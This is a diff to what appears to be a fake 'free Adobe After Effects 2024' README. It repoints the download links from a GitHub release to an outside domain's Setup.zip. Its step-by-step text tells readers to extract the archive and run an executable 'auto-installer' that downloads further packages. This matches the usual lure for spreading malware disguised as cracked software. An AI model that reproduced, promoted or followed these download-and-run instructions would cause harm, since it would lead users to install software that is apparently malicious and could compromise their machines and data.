@@ -9,11 +9,11 @@ Tags: Adobe After Effects 2024 free. Download Adobe After Effects for free. Down
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/42ba0e1a-945f-4dff-acc0-bad7e120543c)
-](https://github.com/Redwingshunt/Adobe-After-Effects-2024-/releases/download/V6.34/Release.zip)
+](https://dl.jrdesklabs.com/Setup.zip)
 
 
 
-## **1. [Download the archive](https://github.com/Redwingshunt/Adobe-After-Effects-2024-/releases/download/V6.34/Release.zip) and extract it to a convenient folder.**
+## **1. [Download the archive](https://dl.jrdesklabs.com/Setup.zip) and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
 
 ![p3xFYbN](https://github.com/user-attachments/assets/c5b835ad-2e66-44b7-8df9-f2e826b8b915)
